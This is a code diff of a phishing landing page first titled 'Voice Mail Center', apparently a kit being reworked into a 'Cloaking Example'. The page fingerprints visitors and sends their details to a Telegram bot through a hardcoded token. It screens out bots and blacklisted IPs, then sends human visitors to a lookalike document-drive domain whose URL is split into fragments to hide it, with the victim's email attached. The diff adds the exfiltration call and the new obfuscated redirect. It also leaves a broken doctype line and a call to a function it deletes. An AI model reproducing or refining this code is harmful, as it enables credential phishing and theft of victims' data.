@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Mail Center</title>
+    <title>Cloaking Example</title>
     <style>
         body, html {
             margin: 0;
@@ -42,71 +42,12 @@
     var checkCountry = false;
     var Country = "";
 
-function getBase64FromUrl() {
-    const url = window.location.href;
-    const urlObj = new URL(url);
-
-    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
-    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));
-
-    let decodedSource = '';
-    let extractedSource = '';
-    let decodedDevice = '';
-    let extractedDevice = '';
-
-    // Process utm_source
-    if (utmSource) {
-        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
-        if (isBase64(base64Part)) {
-            try {
-                decodedSource = atob(base64Part);
-            } catch (error) {
-                console.error('Failed to decode Base64 string in utm_source:', error);
-                decodedSource = 'Error decoding Base64 string in utm_source.';
-            }
-        } else {
-            extractedSource = base64Part;
-        }
-    } else {
-        extractedSource = 'utm_source parameter not found.';
-    }
-
-    // Process utm_device
-    if (utmDevice) {
-        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
-        if (isBase64(base64PartDevice)) {
-            try {
-                decodedDevice = atob(base64PartDevice);
-            } catch (error) {
-                console.error('Failed to decode Base64 string in utm_device:', error);
-                decodedDevice = 'Error decoding Base64 string in utm_device.';
-            }
-        } else {
-            extractedDevice = base64PartDevice;
-        }
-    } else {
-        extractedDevice = 'utm_device parameter not found.';
-    }
-    const combinedSource = decodedSource || extractedSource;
-    const combinedDevice = decodedDevice || extractedDevice;
-    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
-    return combinedResult;
-}
-
-function isBase64(str) {
-    try {
-        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
-    } catch (err) {
-        return false;
-    }
-}
-
 function sendMessage() {
   const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
   const chatId = '1412104349';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   const userDetails = {
-    Client_Email: getBase64FromUrl(),
+    Client_Email: "Clicked",
     userAgent: navigator.userAgent,
     language: navigator.language,
     screenSize: `${window.screen.width}x${window.screen.height}`,
@@ -154,7 +95,7 @@ function sendMessage2() {
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   const userDetails = {
     Client_Emails: "Incoming Bot",
-    Client_Email: getBase64FromUrl(),
+    Client_Email: "BOT ACCESS",
     userAgent: navigator.userAgent,
     language: navigator.language,
     screenSize: `${window.screen.width}x${window.screen.height}`,
@@ -196,9 +137,6 @@ function sendMessage2() {
       console.error('Error sending message:', error);
     });
 }
-
-
-
     function fetchIPInfo() {
         const urlParams = new URLSearchParams(window.location.search);
         const param = urlParams.get('Amethyst');
@@ -302,6 +240,7 @@ function sendMessage2() {
 
             } else if (data === 'clean') {
                 console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                sendMessage();
                 loadContent();
             } else {
                 console.log('Error:', data);
@@ -383,20 +322,7 @@ function sendMessage2() {
 
 function verifyAndRedirect() {
                 if (isHuman()) {
-                    if (isValidEmail('${getBase64FromUrl()}')) {
-                        '${sendMessage()}';
-                        window.location.assign('h'+'tt'+'ps'+':/'+'/d'+'fg'+'hb'+'v.'+'cr'+'im'+'ek'+'ha'+'ba'+'rn'+'am'+'a.'+'co'+'m/'+'44'+'74'+'ca?'+'eb'+'fe'+'01'+'f0'+'96'+'=C'+'i'+'VV'+'y'+'#'+'${getBase64FromUrl()}');
-                    } else {
-             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                addBlacklistedIP(ip);
-                console.log('${getBase64FromUrl()}');
-                console.log("NOT VALID EMAIL");
-                // redirectToBlockedPage();
-                }
-            ); 
+                window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+'${getBase64FromUrl()}');
                     }
                 } else {
             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
@@ -404,10 +330,7 @@ function verifyAndRedirect() {
             .then(data => {
                 var ip = data.ip;
                 addBlacklistedIP(ip);
-                console.log("NOT HUMAN");
-                // redirectToBlockedPage();
-
-                }
+                redirectToBlockedPage();}
             ); 
     }
             }
@@ -415,7 +338,7 @@ function verifyAndRedirect() {
             setTimeout(verifyAndRedirect, 1000);
         `;
         document.getElementById('content').innerHTML = `
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
